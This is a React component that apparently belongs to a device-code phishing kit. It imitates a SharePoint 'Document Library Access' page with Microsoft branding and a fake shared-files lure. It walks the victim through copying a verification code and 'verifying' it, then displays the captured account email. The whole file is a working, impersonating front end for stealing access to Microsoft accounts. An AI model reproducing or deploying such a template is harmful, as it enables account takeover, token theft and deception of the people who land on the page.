import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function SharePointTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('sharepoint');

  return (
    <div className="tpl-page" style={{ background: '#f3f2f1' }}>
      <div className="tpl-container" style={{ maxWidth: 520 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#038387"/><circle cx="16" cy="13" r="6" fill="white" opacity="0.85"/><circle cx="22" cy="19" r="4" fill="white" opacity="0.6"/></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#1b1b1b' }}>SharePoint</span>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Document Library Access</h1>
              <p className="tpl-text">You have been granted access to a SharePoint document library. Verify your identity to view and download files.</p>
              <div className="tpl-info-box" style={{ background: '#e6f4f4', borderColor: '#a8d8d8', color: '#038387' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#038387" strokeWidth="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                <span>Team Documents — 8 files shared with you</span>
              </div>
              <button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleStart}>Verify Access</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Connecting to SharePoint...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Verification Code</h1>
              <p className="tpl-text">Use this code to verify your identity and access the document library.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">VERIFICATION CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the code above</div><div className="tpl-step">2. Click verify and enter the code</div></div>
              <button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Verifying...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Access Granted</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">You can now access the document library.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Access another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#038387' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Microsoft Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
